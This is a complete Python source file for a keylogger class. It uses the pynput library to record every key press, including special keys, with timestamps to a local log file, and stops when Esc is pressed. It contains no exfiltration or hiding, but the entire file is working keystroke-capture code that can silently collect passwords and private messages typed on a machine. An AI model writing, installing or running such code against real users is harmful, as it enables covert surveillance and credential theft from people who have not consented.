import pynput
from pynput.keyboard import Key, Listener
import logging

class KeyLogger:
    def __init__(self, log_file='key_log.txt'):
        self.log_file = log_file
        logging.basicConfig(
            filename = self.log_file,
            level = logging.DEBUG,
            format = '%(asctime)s: %(message)s',
        )

        self.listener = None

    def on_press(self, key):
        try:
            logging.info('Key {0} pressed'.format(key.char))
        except AttributeError:
            logging.info('Special key {0} pressed'.format(key))
    
    def on_release(self, key):
        if key == Key.esc:
            return False
    
    def start(self):
        self.listener = Listener(on_press = self.on_press, on_release = self.on_release)
        self.listener.start()
    
    def stop(self):
        if self.listener is not None:
            self.listener.stop()
            self.listener = None